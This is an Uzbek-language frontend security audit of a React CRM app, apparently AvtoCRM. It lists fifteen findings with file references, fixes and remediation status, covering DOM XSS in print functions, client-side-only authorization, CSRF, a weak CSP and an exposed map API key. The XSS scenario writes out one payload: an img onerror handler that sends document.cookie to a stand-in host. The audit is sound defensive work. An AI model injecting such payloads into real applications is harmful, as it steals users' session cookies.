# Xavfsizlik auditi — `avtocrm`

**Loyiha:** AvtoCRM (React 19 + Vite + TypeScript SPA)
**Backend:** `https://api.avtoyon.uz`
**Audit sanasi:** 2026-06-17
**Ko'lam:** faqat frontend kodbazasi (`src/`, konfiguratsiya, build sozlamalari). Backend kodi tekshirilmadi — backend bilan bog'liq tavsiyalar "tasdiqlash kerak" deb belgilangan.

> **🔧 Tuzatilish holati (2026-06-17):** frontend kodida tuzatib bo'ladigan zaifliklar bartaraf etildi — pastdagi jadvalda **Holat** ustuniga qarang. Lint/test holati: o'zgartirishlar **yangi xato kiritmadi** (mavjud 54 lint xato va 5 test xatosi avvaldan bor — `git stash` bilan tasdiqlangan).

> **Eslatma:** quyidagi topilmalar kod o'qib tasdiqlangan. Har bir topilma `fayl:satr` havolasi bilan berilgan. Tuzatish ushbu hisobotga kiritilmagan — bu faqat diagnostika.

---

## Qisqacha jadval

| № | Topilma | Daraja | Fayl | Holat |
|----|---------|--------|------|-------|
| 1 | Print funksiyalarida DOM-based XSS | 🔴 High | `TransferListPage.tsx`, `StockEntryListPage.tsx` | ✅ Tuzatildi |
| 2 | Avtorizatsiya/role faqat klientda tekshiriladi | 🟠 High* | `App.tsx`, `api.ts` | ⚠️ Backend tasdiqlasin |
| 3 | CSRF himoyasi yo'q (cookie + `withCredentials`) | 🟡 Medium* | `api.ts` | ⚠️ Backend tasdiqlasin |
| 4 | CSP juda bo'sh (`unsafe-inline`, `unsafe-eval`) | 🟡 Medium | `index.html` | 🔸 Qisman (qattiqlashtirildi) |
| 5 | Yandex Maps API kaliti klientda ochiq | 🟡 Medium | `StoreListPage.tsx`, `.env.development` | ⚠️ Yandex panelida cheklang |
| 6 | Vercel'da xavfsizlik HTTP-header'lari yo'q | 🟡 Medium | `vercel.json` | ✅ Tuzatildi |
| 7 | Parol kuchini tekshirish yo'q | 🟢 Low | `ResetPasswordPage.tsx` | ✅ Tuzatildi |
| 8 | Token refresh poyga holati (race) | 🟢 Low | `api.ts` | ✅ Tuzatildi |
| 9 | `logout` fire-and-forget + klientdagi muddat | 🟢 Low | `authService.ts` | ⚠️ Backend tasdiqlasin |
| 10 | O'lik kod: `cookie.ts` (xavfsiz bo'lmagan cookie) | 🟢 Low | `utils/cookie.ts` | ✅ O'chirildi |
| 11 | Console suppress logikasi takrorlangan | ℹ️ Info | `main.tsx`, `logger.ts` | ⏸️ Qoldirildi |
| 12 | `.env.development` git'da + **real Yandex kaliti** | 🟠 High | `.env.development`, `.gitignore` | ✅ Tuzatildi |
| 13 | ESLint'da xavfsizlik qoidalari yo'q | ℹ️ Info | `eslint.config.js` | ✅ Tuzatildi |
| 14 | Hardcoded URL'lar | ℹ️ Info | `api.ts` va b. | ⏸️ Qoldirildi |
| 15 | `innerHTML` ishlatilishi | ℹ️ Info | `ProductListPage.tsx` | ✅ Tuzatildi (DOM API) |

\* Daraja backend himoyasiga bog'liq — quyida izohlangan.

> ⚠️ **Diqqat — real sir topildi (12-topilma yangilandi):** audit/tuzatish jarayonida `.env.development` ishchi nusxasida **haqiqiy Yandex Maps API kaliti** (`92688ac7-...`) borligi aniqlandi. Kalit git **tarixiga commit qilinmagan** (faqat lokal ishchi nusxada). Chora ko'rildi: `git rm --cached .env.development` bilan fayl kuzatuvdan chiqarildi va `.gitignore`ga `.env.*` qo'shildi — kalit endi commit qilinmaydi. **Tavsiya:** agar bu kalit biror joyga push qilingan bo'lsa — Yandex panelida bekor qilib, yangisini yarating va uni domen bo'yicha cheklang.

---

## 🔴 Yuqori daraja (High)

### 1. DOM-based XSS — chop etish (print) funksiyalarida

**Fayllar:**
- `src/features/transfers/pages/TransferListPage.tsx:103-180` (`handlePrintTransfer`)
- `src/features/StockEntry/StockEntryListPage.tsx:313-374` (`handlePrintEntry`)

**Muammo:** backend'dan kelgan maydonlar (`item.product_name`, `item.sku`, `fromStore`, `toStore`, `storeName`, `item.product_barcode`) HTML string ichiga to'g'ridan-to'g'ri qo'yiladi va `win.document.write(html)` orqali yangi oynaga yoziladi. Hech qanday escaping qo'llanilmaydi.

```tsx
// TransferListPage.tsx:112-121
rows = transfer.items.map((item, idx) => `
  <tr>
    <td>${idx + 1}</td>
    <td>${item.product_name || '-'}</td>      // ← escaping yo'q
    <td>${item.sku || item.product_sku || item.product_barcode || '-'}</td>
    ...
`).join('');
// :151
<div class="header">${dateStr} &nbsp; ${fromStore} → ${toStore}</div>
// :170-174
const win = window.open('', '_blank');
win.document.open();
win.document.write(html);   // ← payload bajariladi
```

**Stsenariy:** sotuvchi (yoki kompromat qilingan backend) mahsulot nomini `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">` qilib qo'ysa, hujjatni chop etishda ixtiyoriy JavaScript yangi oyna kontekstida bajariladi. CRM ko'p-foydalanuvchili bo'lgani uchun bu real (boshqa foydalanuvchi kiritgan ma'lumot sizning brauzeringizda bajariladi).

**Muhim:** loyihada `escapeHtml()` yordamchisi allaqachon mavjud (`src/utils/xss.ts:12`) va `ProductBarcodePage.tsx` hamda `ProductListPage.tsx`da to'g'ri ishlatilgan — bu ikki print funksiyasida esa **unutilgan**.

**Yechim:** barcha foydalanuvchi/backend maydonlarini template'ga qo'yishdan oldin `escapeHtml(...)` bilan o'rash:
```tsx
import { escapeHtml } from '../../utils/xss';
<td>${escapeHtml(item.product_name || '-')}</td>
<div class="header">${dateStr} &nbsp; ${escapeHtml(fromStore)} → ${escapeHtml(toStore)}</div>
```

---

### 2. Avtorizatsiya va role tekshiruvi faqat klientda

**Fayllar:** `src/App.tsx` (`requireNoSeller`, `isSuperUser ? withLayout(...) : <Navigate>`), `src/services/api.ts` (`hasStoredAuth` → `localStorage.crm_auth_time`)

**Muammo:** foydalanuvchi roli va "kirgan/kirmagan" holati faqat klientda (Zustand store + `localStorage`) tekshiriladi. Brauzer DevTools orqali store holatini o'zgartirib, taqiqlangan sahifalarni (masalan `/stores/users`) ochish mumkin.

**Daraja izohi:** agar **backend har bir endpoint'da rol/ruxsatni majburiy tekshirsa**, bu faqat UX masalasi (Low). Agar backend faqat klientga ishonsa — bu **Critical** avtorizatsiya bypass. Shu sababli "High*" deb belgilandi.

**Yechim:** klient tekshiruvlari faqat UI uchun qoladi. Har bir maxfiy/state-o'zgartiruvchi endpoint backend tomonida rolни tekshirib, ruxsatsiz so'rovga `403` qaytarishi shart. **Backend'da tasdiqlash kerak.**

---

## 🟡 O'rta daraja (Medium)

### 3. CSRF himoyasi yo'q (cookie + `withCredentials: true`)

**Fayl:** `src/services/api.ts:59-67`, `:93-112` (request interceptor)

**Muammo:** autentifikatsiya httpOnly cookie orqali amalga oshiriladi (`withCredentials: true`), lekin so'rovlarga `X-CSRFToken` (yoki shunga o'xshash) header qo'shilmaydi. Request interceptor faqat `Accept-Language` qo'shadi.

```ts
const api = axios.create({ baseURL: BaSE_URL, withCredentials: true });  // cookie yuboriladi
// interceptor — CSRF token qo'shilmaydi
```

**Stsenariy:** agar backend cookie'lari `SameSite=Strict/Lax` bilan to'g'ri himoyalanmagan bo'lsa, zararli sayt foydalanuvchi nomidan state-o'zgartiruvchi so'rov (sotuv, transfer, parol o'zgartirish) yuborishi mumkin — brauzer cookie'ni avtomatik biriktiradi.

**Yechim:** backend cookie'larining `SameSite` siyosatini tekshirish. Kerak bo'lsa CSRF-token sxemasini joriy etish va interceptor'da `POST/PUT/PATCH/DELETE` so'rovlariga header qo'shish. **Backend bilan tasdiqlash kerak.**

---

### 4. CSP juda bo'sh — `'unsafe-inline'` va `'unsafe-eval'`

**Fayl:** `index.html:5`

```html
<meta http-equiv="Content-Security-Policy"
  content="... script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://api-maps.yandex.ru https://yastatic.net blob:; ...">
```

**Muammo:** `script-src`da `'unsafe-inline'` va `'unsafe-eval'` borligi CSP'ning XSS'ga qarshi asosiy himoyasini deyarli yo'qqa chiqaradi — inline `<script>` va `eval()` baribir ishlaydi. Bu 1-topilmadagi XSS ta'sirini kuchaytiradi (defense-in-depth yo'q).

**Yechim:** `'unsafe-eval'`ni olib tashlash; inline skriptlar uchun nonce/hash ishlatish; tashqi CDN'larni (kerak bo'lmasa) cheklash. `object-src 'none'` va `frame-ancestors 'none'` qo'shish.

---

### 5. Yandex Maps API kaliti klient kodida ochiq

**Fayl:** `src/features/stores/StoreListPage.tsx:171-174`

```ts
const apiKey = (import.meta as any).env?.VITE_YANDEX_MAPS_API_KEY as string | undefined;
const src = apiKey
  ? `https://api-maps.yandex.ru/2.1/?lang=ru_RU&apikey=${apiKey}`
  : 'https://api-maps.yandex.ru/2.1/?lang=ru_RU';
```

**Muammo:** `VITE_*` o'zgaruvchilari build ichiga kiritiladi va brauzerda to'liq ko'rinadi. Kalit domen bo'yicha cheklanmagan bo'lsa, uni nusxalab suiiste'mol qilish (kvota tugatish, hisobni qimmatga tushirish) mumkin.

**Yechim:** Yandex panelida kalitni **domen (referer) bo'yicha cheklash** — bu klient-side map kalitlari uchun standart yechim. Yoki backend proxy orqali yuklash.

---

### 6. Vercel'da xavfsizlik HTTP-header'lari yetishmaydi

**Fayl:** `vercel.json`

**Muammo:** `headers` bo'limida faqat `Cache-Control` bor. Quyidagi himoya header'lari yo'q:
- `X-Content-Type-Options: nosniff`
- `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy` (kamera/mikrofon/geolokatsiya)
- `X-Frame-Options: DENY` yoki CSP `frame-ancestors 'none'` (clickjacking'ga qarshi)

**Yechim:** `vercel.json`ning `headers` ro'yxatiga `"source": "/(.*)"` uchun yuqoridagi header'larni qo'shish. (CSP hozir meta-tag'da; HTTP-header sifatida ishonchliroq.)

---

## 🟢 Past daraja (Low) / mustahkamlash

### 7. Parol kuchini tekshirish yo'q
**Fayl:** `src/features/auth/ResetPasswordPage.tsx`
Faqat `newPassword === confirmPassword` tekshiriladi; minimal uzunlik/murakkablik yo'q — "1" kabi parol qo'yilishi mumkin. Asosiy tekshiruv backend'da bo'lishi shart, lekin klientda ham qo'shish foydali (UX + himoya).

### 8. Token refresh poyga holati (race condition)
**Fayl:** `src/services/api.ts:135-182`
Refresh muvaffaqiyatsiz bo'lganda `isRefreshing` `false`ga qaytadi va `_retry` faqat bitta so'rov uchun. Refresh xato bersa, navbatdagi yangi so'rovlar yana refresh urinib, ortiqcha so'rovlar ("storm") yuzaga kelishi mumkin. `_refreshFailed` bayrog'ini qo'shib, takroriy refresh urinishini bloklash tavsiya etiladi.

### 9. `logout` fire-and-forget + klientdagi muddat
**Fayl:** `src/services/authService.ts:38-57`
```ts
logout: async () => {
  try { await apiClient.post('/users/logout/', ...); } catch { /* jim */ }
  localStorage.removeItem('crm_auth_time');
}
```
Logout xatosi jimgina yutiladi — server sessiyani bekor qilmasa ham klient "chiqdim" deb hisoblaydi. Shuningdek `fetchProfile`dagi 7-kunlik muddat faqat klientda (`crm_auth_time`) tekshiriladi va xavfsizlik chegarasi sifatida ishonib bo'lmaydi (qurilma soatini o'zgartirib uzaytirish mumkin). Sessiya yaroqliligini server hal qilishi kerak.

### 10. O'lik kod: `src/utils/cookie.ts` (xavfsiz bo'lmagan cookie sozlamasi)
`cookieAuth` obyekti hech qayerda import qilinmaydi/ishlatilmaydi (real auth httpOnly cookie + `localStorage.crm_auth_time` orqali). Bundan tashqari u `sameSite: 'lax'` va `secure: import.meta.env.PROD` (dev'da `secure=false`) bilan cookie o'rnatadi. Chalkashlikni oldini olish uchun **faylni o'chirish** tavsiya etiladi.

---

## ℹ️ Kod sifati / boshqa kamchiliklar (Info)

**11. Console suppress logikasi ikki joyda takrorlangan**
`src/main.tsx` va `src/utils/logger.ts` — ikkalasi ham production'da `console.*`ni o'chiradi, lekin mos kelmaydigan shartlar bilan (`import.meta.env.MODE !== 'development'` vs `environment !== 'development'`). Bitta manbaga (logger) birlashtirish kerak.

**12. `.env.development` git'ga commit qilingan**
Hozir sir yo'q (faqat `VITE_API_URL`), lekin xavfli amaliyot — `.gitignore` faqat `*.local`ni e'tiborsiz qoldiradi. `.gitignore`ga `.env*` (yoki `.env`, `.env.*`) qo'shib, namuna sifatida `.env.example` yaratish tavsiya etiladi.

**13. ESLint'da xavfsizlik qoidalari yo'q**
`eslint.config.js`da `@typescript-eslint/no-explicit-any: 'off'`. `react/no-danger`, `no-eval`, `no-implied-eval`, `no-new-func` kabi qoidalar yo'q — bular XSS/injection'ni erta ushlashga yordam beradi.

**14. Hardcoded URL'lar**
`api.ts:7-9`, `notificationService.ts`, `vite.config.ts` (proxy target) — `api.avtoyon.uz` qattiq yozilgan. Endpoint o'zgarsa qayta build kerak; environment o'zgaruvchisiga ko'chirish maqsadga muvofiq.

**15. `innerHTML` ishlatilishi (hozir xavfsiz)**
`src/features/products/ProductListPage.tsx:514, 773` — rasm `onError`'da `parentElement.innerHTML = '<div>...</div>'`. Hozir string statik (foydalanuvchi ma'lumoti yo'q), shuning uchun xavfsiz, lekin amaliyot xavfli. `document.createElement` + `textContent`ga o'tkazish tavsiya etiladi.

---

## Tekshirilib, RAD etilgan da'volar (shaffoflik uchun)

Audit jarayonida quyidagi da'volar ko'tarildi, lekin **kod o'qib tekshirilganda tasdiqlanmadi** — ular real muammo emas:

- ❌ **"`dist/` build papkasi git'ga commit qilingan"** — yo'q, `dist` `.gitignore`da (`git ls-files`da yo'q).
- ❌ **"Production'da source map'lar ochiq"** — `vite.config.ts`da `build.sourcemap` ko'rsatilmagan; Vite default'da prod'da sourcemap **o'chiq**.
- ❌ **"WebSocket auth token'ni URL'da yuboradi (loglarda ochiladi)"** — kodda token URL'da yuborilmaydi; faqat umumiy mustahkamlash maslahati sifatida e'tiborga olish mumkin (auth — cookie orqali).

---

## Ustuvorlik (tavsiya etilgan tartib)

1. **🔴 1-topilma** — print funksiyalarida `escapeHtml()` qo'shish (eng aniq, real XSS).
2. **🟠 2-topilma** — backend'da rol/ruxsat majburiy tekshirilishini tasdiqlash.
3. **🟡 3, 6-topilmalar** — CSRF/SameSite siyosatini tekshirish; Vercel header'larini qo'shish.
4. **🟡 4, 5-topilmalar** — CSP'ni qattiqlashtirish; Yandex kalitini domen bo'yicha cheklash.
5. **🟢 / ℹ️** — qolgan past darajali va sifat masalalari (planli ravishda).
